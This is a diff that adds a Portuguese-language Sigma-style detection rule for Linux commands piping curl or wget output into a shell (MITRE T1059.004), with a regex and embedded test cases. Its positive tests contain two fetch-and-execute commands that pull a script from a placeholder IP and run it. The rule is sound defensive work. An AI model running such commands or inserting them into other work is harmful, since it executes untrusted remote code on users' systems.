@@ -1,0 +1,28 @@
+title: 'Download executado direto no shell (curl ou wget em pipe)'
+id: '063364e0-9d12-5b7a-90eb-aab001591a5e'
+status: 'stable'
+description: 'Baixar um script e entregá-lo ao shell na mesma linha executa código sem deixar arquivo para inspeção.'
+references:
+    - 'https://attack.mitre.org/techniques/T1059/004/'
+author: 'RuleForge (regras de exemplo)'
+date: '2026/10/23'
+tags:
+    - 'attack.execution'
+    - 'attack.t1059.004'
+logsource:
+    category: 'process_creation'
+    product: 'linux'
+detection:
+    selection:
+        CommandLine|re: '(curl|wget)\s+[^|]*\|\s*(ba|z)?sh\b'
+    condition: 'selection'
+falsepositives:
+    - 'Instaladores que recomendam esse formato (devem ser revisados)'
+level: 'high'
+x_tests:
+    positive:
+        - {Image: '/usr/bin/bash', CommandLine: 'curl -s http://203.0.113.5/i.sh | sh'}
+        - {Image: '/usr/bin/bash', CommandLine: 'wget -qO- http://203.0.113.5/i.sh | bash'}
+    negative:
+        - {Image: '/usr/bin/curl', CommandLine: 'curl -s http://exemplo.invalid/status'}
+        - {Image: '/usr/bin/bash', CommandLine: 'curl -s http://exemplo.invalid/a.json | jq .'}
